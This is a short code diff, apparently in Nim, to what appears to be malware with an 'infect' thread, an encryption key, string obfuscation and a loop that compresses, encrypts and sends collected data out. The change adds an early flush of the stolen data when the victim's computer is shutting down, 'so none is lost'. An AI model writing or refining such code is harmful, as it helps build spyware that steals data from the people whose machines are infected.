@@ -1,3 +1,5 @@
+import lib/functions/hideString
+
 from lib/flags import USE_INFECT_THREAD
 when USE_INFECT_THREAD:
   # decrypt file if args passed
@@ -11,7 +13,6 @@ when USE_INFECT_THREAD:
 
   from lib/more/xxtea import decrypt
 
-  import lib/functions/hideString
 
   from lib/flags import INFECT_ENCRYPTION_KEY
 
@@ -211,6 +212,11 @@ while true:
   if dataAvailable:
     let (thread, data) = msg
 
+    ## the user might shutdown his pc, try and send data
+    ## so none is lost
+    if thread == d e "sd":
+      TICKS = SEND_INTERVAL # shortcut for sending
+
     if prevThread != thread:
       prevThread = thread
       res.add "." & thread & ","
@@ -219,10 +225,7 @@ while true:
     finalData = encrypt compress(res, stream = RAW_DEFLATE)
 
     if finalData.len > SEND_SIZE:
-      sendThreadChannel.send finalData
-      TICKS = 0
-      res = ""
-      prevThread = ""
+      TICKS = SEND_INTERVAL
 
   if TICKS == SEND_INTERVAL:
     sendThreadChannel.send finalData
